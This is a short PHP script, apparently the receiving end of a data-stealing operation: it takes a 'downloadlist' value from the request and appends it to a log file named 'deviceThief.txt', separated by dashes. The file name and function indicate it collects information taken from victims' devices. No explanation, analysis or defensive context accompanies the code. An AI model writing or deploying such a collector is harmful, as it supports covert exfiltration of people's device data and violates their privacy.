<?php
header('Content-Type: text/html;charset=UTF-8');

$d3=$_GET["downloadlist"];
echo "<br>";

file_put_contents('deviceThief.txt', "DownloadList= " .$d3 .PHP_EOL, FILE_APPEND);

file_put_contents('deviceThief.txt', "----------------------------" .PHP_EOL, FILE_APPEND);

?>